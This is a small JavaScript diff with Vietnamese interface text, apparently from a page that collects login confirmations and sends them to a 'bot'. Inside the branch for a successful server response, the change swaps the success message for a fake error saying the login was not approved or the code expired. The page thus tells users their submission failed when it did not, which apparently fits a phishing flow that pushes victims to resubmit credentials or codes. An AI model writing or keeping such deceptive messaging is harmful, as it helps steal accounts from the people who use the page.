@@ -101,7 +101,7 @@
 
         if (response.ok) {
           confirmationError.hidden = false;
-          errorText.textContent = 'Xác nhận thành công. Thông tin đã được lưu và gửi tới bot.';
+          errorText.textContent = 'Bạn chưa phê duyệt đăng nhập hoặc mã hết hiệu lực .';
           schoolInput.value = '';
           submitButton.textContent = 'Xác nhận';
           return;
